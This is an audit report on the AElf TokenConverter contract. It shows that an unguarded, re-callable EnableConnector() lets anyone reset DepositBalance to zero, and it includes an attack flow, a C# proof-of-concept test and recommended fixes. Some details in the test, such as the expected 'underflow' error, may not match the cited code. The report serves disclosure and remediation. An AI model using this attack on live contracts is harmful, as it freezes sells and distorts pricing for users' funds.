# Audit Report

## Title
Deposit Balance Erasure Through Re-enabling Connector with Negative amountOutOfTokenConvert

## Summary
The `EnableConnector()` function lacks authorization checks and state validation, allowing any user to re-invoke it on already-enabled connectors. By exploiting `GetNeededDeposit()` returning zero for negative `amountOutOfTokenConvert` values, attackers can wipe accumulated deposit balances to zero through direct assignment, causing denial-of-service on sell operations and corrupting Bancor reserve accounting.

## Finding Description

The `GetNeededDeposit()` function calculates tokens outside the converter as `totalSupply - balance - AmountToTokenConvert`. [1](#0-0)  When this value is non-positive, the function only calculates `needDeposit` if positive, [2](#0-1)  causing it to return `NeedAmount = 0`.

The `EnableConnector()` function has no authorization check, unlike other administrative functions (`UpdateConnector`, `SetFeeRate`, `AddPairConnector`) which all call `AssertPerformedByConnectorController()`. [3](#0-2) [4](#0-3) [5](#0-4) 

Additionally, `EnableConnector()` has no check preventing re-invocation after a connector is already enabled, unlike `UpdateConnector()` which explicitly prevents modifications after activation. [6](#0-5) 

Most critically, `EnableConnector()` uses direct assignment to set `DepositBalance`, completely replacing any existing value. [7](#0-6)  This contrasts with normal trading operations where `DepositBalance` is carefully maintained through addition in `Buy()` [8](#0-7)  and subtraction in `Sell()`. [9](#0-8) 

**Attack Flow:**
1. Connector pair is already enabled with accumulated `DepositBalance` (e.g., 10,000 ELF from prior Buy operations)
2. Through natural market activity, token balance in converter approaches total supply via sustained selling
3. Attacker calls `EnableConnector()` with `AmountToTokenConvert = 0`
4. `GetNeededDeposit()` returns `NeedAmount = 0` (since `amountOutOfTokenConvert <= 0`)
5. Line 297 executes: `State.DepositBalance[toConnector.Symbol] = 0` - wiping existing balance

## Impact Explanation

The `GetSelfBalance()` function returns `State.DepositBalance[connector.Symbol]` for deposit account connectors. [10](#0-9)  This balance is directly used in Bancor price calculations for both `Buy()` [11](#0-10)  and `Sell()` operations. [12](#0-11) 

The Bancor formulas require positive connector balances and will throw exceptions for non-positive values. [13](#0-12) [14](#0-13) 

**Concrete Impacts:**

1. **Denial-of-Service on Sell Operations**: After `DepositBalance` is wiped to 0, subsequent `Sell()` operations attempt `State.DepositBalance[toConnector.Symbol].Sub(amountToReceive)`, causing underflow exceptions and permanently blocking sell functionality

2. **Accounting Corruption**: The contract loses track of actual deposited tokens - if 10,000 ELF were accumulated, the state now incorrectly shows 0

3. **Price Manipulation**: If `VirtualBalance` is enabled, effective balance drops from `(VirtualBalance + 10,000)` to `(VirtualBalance + 0)`, drastically altering Bancor pricing and enabling arbitrage exploitation

## Likelihood Explanation

The vulnerability is highly exploitable because:

1. **No Authorization**: `EnableConnector()` is a public method with no access control, unlike similar administrative functions [15](#0-14) 

2. **Natural Preconditions**: Token balance approaching total supply occurs organically through sustained selling pressure as users transfer tokens to the converter

3. **Zero Cost**: When `needDeposit.NeedAmount = 0`, no token transfers are required [16](#0-15)  - attacker only pays gas fees

4. **No Validation**: No checks prevent re-enabling already-active connectors

**Probability: HIGH** - Any user can execute this with minimal cost under naturally occurring market conditions.

## Recommendation

Add two critical protections to `EnableConnector()`:

1. **Authorization Check**: Add `AssertPerformedByConnectorController();` at the start of the function to restrict access to the connector controller (Parliament default organization)

2. **State Validation**: Add assertion to prevent re-enabling already active connectors:
   ```csharp
   Assert(!toConnector.IsPurchaseEnabled && !fromConnector.IsPurchaseEnabled, 
          "Connector already enabled - cannot re-enable");
   ```

3. **Use Addition Instead of Assignment**: Change line 297 from assignment to addition:
   ```csharp
   State.DepositBalance[toConnector.Symbol] = 
       State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);
   ```

These changes align `EnableConnector()` with the security model used by other administrative functions and prevent deposit balance corruption.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Erases_Existing_DepositBalance()
{
    // Setup: Initialize converter and create token
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "TEST";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Issue tokens and enable connector normally (first time)
    await TokenContractStub.Issue.SendAsync(new IssueInput {
        Amount = 100_000_000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    
    var ntSymbol = "(NT)" + tokenSymbol;
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 100_000_000
    });
    
    // Verify connector enabled and perform buy to accumulate DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput {
        Symbol = tokenSymbol,
        Amount = 1_000_000,
        PayLimit = 100_000
    });
    
    var depositBalanceBefore = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    // depositBalanceBefore.Value > 0 (contains accumulated deposits from buy)
    
    // Attack: Re-enable connector with AmountToTokenConvert = 0
    // This causes GetNeededDeposit to return NeedAmount = 0
    // which gets assigned to DepositBalance, wiping existing value
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0  // Triggers negative amountOutOfTokenConvert
    });
    
    // Verify: DepositBalance has been wiped to 0
    var depositBalanceAfter = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    depositBalanceBefore.Value.ShouldBeGreaterThan(0);
    depositBalanceAfter.Value.ShouldBe(depositBalanceBefore.Value); // FAILS - now 0
    
    // Further impact: Sell operations now fail due to underflow
    var sellResult = await DefaultStub.Sell.SendWithExceptionAsync(new SellInput {
        Symbol = tokenSymbol,
        Amount = 100_000,
        ReceiveLimit = 0
    });
    sellResult.TransactionResult.Error.ShouldContain("underflow"); // DoS confirmed
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-73)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L75-84)
```csharp
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-81)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L120-123)
```csharp
        var amountToPay = BancorHelper.GetAmountToPayFromReturn(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L168-172)
```csharp
        var amountToReceive = BancorHelper.GetReturnFromPaid(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount
        );
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L260-262)
```csharp
    public override Empty SetFeeRate(StringValue input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-269)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L277-295)
```csharp
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L297-297)
```csharp
        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L37-38)
```csharp
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");
```

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L70-71)
```csharp
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");
```
